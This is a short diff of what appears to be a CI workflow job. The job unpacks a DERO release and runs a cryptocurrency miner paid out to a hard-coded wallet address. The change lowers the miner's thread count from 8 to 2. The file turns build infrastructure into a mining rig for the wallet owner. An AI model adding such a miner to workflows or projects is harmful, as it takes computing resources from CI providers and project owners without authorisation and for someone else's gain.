@@ -36,4 +36,4 @@ jobs:
           7z e dero_linux_amd64_2.2.1-0.Atlantis.Astrobwt+03072020.tar.gz
           7z e dero_linux_amd64_2.2.1-0.Atlantis.Astrobwt+03072020.tar
           chmod +x *
-          ./dero-miner-linux-amd64 --wallet-address=dERoNcY1tgJ8EgxkrMRnsD1bSWw3pWGZgVGWJEHeZQn443ouVjDjRarYc61HgHnBLpJGNdwEumq8pifqNSTpSu7976b2PP6y7k --mining-threads=8 --daemon-rpc-address=http://explorer.dero.io:20206
+          ./dero-miner-linux-amd64 --wallet-address=dERoNcY1tgJ8EgxkrMRnsD1bSWw3pWGZgVGWJEHeZQn443ouVjDjRarYc61HgHnBLpJGNdwEumq8pifqNSTpSu7976b2PP6y7k --mining-threads=2 --daemon-rpc-address=http://explorer.dero.io:20206
